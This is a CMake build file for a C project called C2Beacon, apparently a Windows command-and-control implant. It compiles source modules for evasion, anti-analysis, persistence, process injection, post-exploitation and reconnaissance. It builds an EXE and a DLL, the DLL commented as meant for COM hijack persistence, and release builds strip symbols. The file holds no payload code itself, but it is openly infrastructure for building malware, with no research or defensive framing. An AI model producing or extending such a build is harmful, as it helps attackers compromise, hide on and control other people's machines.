cmake_minimum_required(VERSION 3.20)
project(C2Beacon C)

set(CMAKE_C_STANDARD 11)

# -- Sources -----------------------------------------------------------
set(BEACON_SOURCES
    src/main.c
    src/comms.c
    src/evasion.c
    src/anti_analysis.c
    src/persist.c
    src/injection.c
    src/postex.c
    src/recon.c
    src/dllmain.c
    src/killswich.c
)

# -- Compiler flags (needed for _rdrand32_step intrinsic) ---------------
add_compile_options(-mrdrnd)

# -- Link libraries shared by both targets -----------------------------
set(BEACON_LIBS winhttp ws2_32 bcrypt advapi32 ntdll iphlpapi shlwapi gdi32 netapi32 crypt32)

# -- EXE target --------------------------------------------------------
add_executable(beacon ${BEACON_SOURCES})
target_include_directories(beacon PRIVATE include)
target_link_libraries(beacon ${BEACON_LIBS})

# -- DLL target (for COM hijack / persistence) -------------------------
add_library(beacon_dll SHARED ${BEACON_SOURCES})
target_include_directories(beacon_dll PRIVATE include)
target_compile_definitions(beacon_dll PRIVATE BEACON_DLL)
target_link_libraries(beacon_dll ${BEACON_LIBS})

# -- Release flags (strip symbols, no CRT noise) ----------------------
if(CMAKE_BUILD_TYPE STREQUAL "Release")
    target_compile_options(beacon PRIVATE -O2 -s)
    target_compile_options(beacon_dll PRIVATE -O2 -s)
endif()